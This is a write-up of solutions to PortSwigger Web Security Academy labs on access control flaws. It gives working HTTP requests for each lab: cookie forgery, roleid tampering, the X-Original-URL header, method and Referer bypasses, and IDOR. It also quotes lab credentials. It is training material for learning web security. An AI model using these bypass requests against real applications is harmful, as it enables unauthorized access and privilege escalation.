---
description: https://portswigger.net/web-security/access-control
---

# Access control vulnerabilities and privilege escalation

### Lab: Unprotected admin functionality

This lab has an unprotected admin panel.

https://acb81fea1fd8246fc0b51cc000a700ba.web-security-academy.net/robots.txt

```
User-agent: *
Disallow: /administrator-panel
```

There is an admin panel url disclosure. And also there is no access control on it. This is a vertical privilege escalation.

### Lab: Unprotected admin functionality with unpredictable URL

This lab has an unprotected admin panel. It's located at an unpredictable location, but the location is disclosed somewhere in the application.

view-source:https://ac0e1f151e657ee0c0873706000e0014.web-security-academy.net/

```
<script>
...
   adminPanelTag.setAttribute('href', '/admin-oy1uoa');
...
</script>
```

There is an admin panel url disclosure.

### Lab: User role controlled by request parameter

This lab has an admin panel at /admin, which identifies administrators using a forgeable cookie.

```
Cookie: Admin=false;

Proxy → Options → Match and Replace → Add → 
Match → Admin=false
Replace → Admin=true
```

With this arrangement, we can access admin panel.

### Lab: User role can be modified in user profile

This lab has an admin panel at /admin. It's only accessible to logged-in users with a roleid of 2.

```
POST /my-account/change-email
...
{"email":"wiener@normal-user.net"}
--------
Response:
{
  "username": "wiener",
  "email": "wiener@normal-user.net",
  "apikey": "XlYHWaH45FGKxxhwzymauoYnUYk1A11S",
  "roleid": 1
}
```

```
POST /my-account/change-email
...
{
  "email":"wiener@normal-user.net",
  "roleid": 2
}
--------
Response:
{
  "username": "wiener",
  "email": "wiener@normal-user.net",
  "apikey": "XlYHWaH45FGKxxhwzymauoYnUYk1A11S",
  "roleid": 2
}
```

After this request, we got administrator rights. There is no control on the post request. So we can change privilege.

### Lab: URL-based access control can be circumvented

This website has an unauthenticated admin panel at /admin, but a front-end system has been configured to block external access to that path. However, the back-end application is built on a framework that supports the X-Original-URL header.

`GET /admin HTTP/1.1 - 403 Forbidden`

```
GET /
X-Original-URL: /admin
```

The response contains /admin page contents.

`https://acf81f9b1f02b026c06a1dce00e100ce.web-security-academy.net/admin/delete?username=carlos`

User deletion:

```
GET /?username=carlos HTTP/1.1

X-Original-URL: /admin/delete
```

### Lab: Method-based access control can be circumvented

This lab implements access controls based partly on the HTTP method of requests.

We can see this request with administrator user.

```
POST /admin-roles HTTP/1.1
...
username=carlos&action=upgrade
```

```
GET /admin - HTTP/1.1 401 Unauthorized
POST /admin-roles - HTTP/1.1 401 Unauthorized
```

With non privileged user, we can get 401 Unauthorized error.

But we can bypass the error with another type of request instead of using POST.

```
GET /admin-roles?username=wiener&action=upgrade HTTP/1.1 - 302 Found
GET /admin - 200 OK
```

### Lab: User ID controlled by request parameter

This lab has a horizontal privilege escalation vulnerability on the user account page.

`https://ac4c1f6b1f6bfaadc0aa8982008b003c.web-security-academy.net/my-account?id=carlos`

There is acces control on id parameter. We can access any user data with it.

### Lab: User ID controlled by request parameter, with unpredictable user IDs

This lab has a horizontal privilege escalation vulnerability on the user account page, but identifies users with GUIDs.

`https://acbd1f801e9bd40ec09a2c4f00a700a5.web-security-academy.net/post?postId=3`

We could identify Carlos's id in a blog post.

Carlos - `https://acbd1f801e9bd40ec09a2c4f00a700a5.web-security-academy.net/blogs?userId=a62ef538-3744-46cd-813f-3355c5ae6d55`

`https://acbd1f801e9bd40ec09a2c4f00a700a5.web-security-academy.net/my-account?id=a62ef538-3744-46cd-813f-3355c5ae6d55`

There is no access control on id parameter. We can access any user data with it.

### Lab: User ID controlled by request parameter with data leakage in redirect

This lab contains an access control vulnerability where sensitive information is leaked in the body of a redirect response.

`https://acab1f031fa840ebc0970272006000be.web-security-academy.net/my-account?id=carlos`

There is weak access control on id parameter. We can access any user data at response. It is redirecting to login page. But the data is in redirect body.

### Lab: User ID controlled by request parameter with password disclosure

This lab has user account page that contains the current user's existing password, prefilled in a masked input.

`https://acef1faf1f9773a2c0c95a3d00a200af.web-security-academy.net/my-account?id=administrator`

```
<input required type=password name=password value='pa40wxzz5118q3ebk8xf'/>
```

There is no access control on id parameter. We can access any user data with it. The data can lead to vertical privilege escalation.

### Lab: Insecure direct object references

Insecure direct object references (IDOR) are a type of access control vulnerability that arises when an application uses user-supplied input to access objects directly.

This lab stores user chat logs directly on the server's file system, and retrieves them using static URLs.

```
Chat → View transcript
GET /download-transcript/2.txt
```

We can download any chat document with visiting the url.

```
GET /download-transcript/1.txt HTTP/1.1
---
You: Ok so my password is ssicu9unbdutm328j85t. Is that right?
```

### Lab: Multi-step process with no access control on one step

This lab has an admin panel with a flawed multi-step process for changing a user's role.

The workflow is as follows:

* GET /admin
*   POST /admin-roles

    username=carlos\&action=upgrade
*   POST /admin-roles

    action=upgrade\&confirmed=true\&username=carlos
* GET /admin

`GET /admin - Admin interface only available if logged in as an administrator`

`POST /admin-roles username=wiener&action=upgrade - "Unauthorized"`

```
POST /admin-roles - OK
action=upgrade&confirmed=true&username=wiener
---
GET /admin-roles?action=upgrade&confirmed=true&username=wiener - OK
```

### Lab: Referer-based access control

This lab controls access to certain admin functionality based on the Referer header.

The workflow is as follows:

*   GET /admin-roles?username=carlos\&action=upgrade

    Referer: https://acfd1f341ed97ec7c0d9686c002500aa.web-security-academy.net/admin

    OR
*   GET /admin-roles?username=carlos\&action=downgrade

    Referer: https://acfd1f341ed97ec7c0d9686c002500aa.web-security-academy.net/admin

Answer:

```
GET /admin-roles?username=wiener&action=upgrade
Referer: https://acfd1f341ed97ec7c0d9686c002500aa.web-security-academy.net/admin
```
